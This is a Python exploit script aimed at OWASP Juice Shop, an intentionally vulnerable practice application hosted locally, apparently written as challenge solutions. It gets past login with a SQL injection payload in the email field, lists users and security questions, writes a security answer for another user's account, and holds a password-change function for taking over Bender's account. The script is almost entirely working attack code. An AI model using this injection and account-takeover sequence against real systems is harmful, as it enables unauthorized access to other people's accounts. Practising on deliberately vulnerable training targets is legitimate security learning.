import requests
import json


BASE = 'http://preview.owasp-juice.shop/'
BASE = 'http://localhost:3000/'


def login():
    sess = requests.Session()
    form = {'email': "bender@juice-sh.op'--", 'password': "a"}
    r = sess.post(BASE + 'rest/user/login', data=form)
    print(r.text)
    res = json.loads(r.text)
    token = res['authentication']['token']
    hd = {'Authorization': 'Bearer ' + token}  # , 'Cookie': cookies}
    sess.headers.update(hd)
    return sess


def get_users(sess=None):
    sess = sess or requests.Session()
    r = sess.get(BASE + 'api/Users')
    print(r.text)
    return sess


def get_questions(sess=None):
    sess = sess or requests.Session()
    r = sess.get(BASE + 'api/SecurityQuestions')
    print(r.text)
    return sess


def set_anwser(sess=None, uid=4, qid=10):
    sess = sess or requests.Session()
    form = {
            'UserId': uid,
            'SecurityQuestionId': qid,
            'answer': 'OWASP'
        }
    r = sess.post(BASE + 'api/SecurityAnswers', data=form)
    print(r.text)
    return sess


def change_pwd(sess=None, pwd="slurmCl4ssic"):
    """Change Bender's password into slurmCl4ssic without using SQL"""
    sess = sess or requests.Session()
    form = {
            "new": pwd,
            "repeat": pwd
        }
    r = sess.get(BASE + 'rest/user/change-password', params=form)
    print(r.text)
    return sess


if __name__ == '__main__':
    sess = login()
    get_users(sess)
    set_anwser(sess)
    # change_pwd(sess)
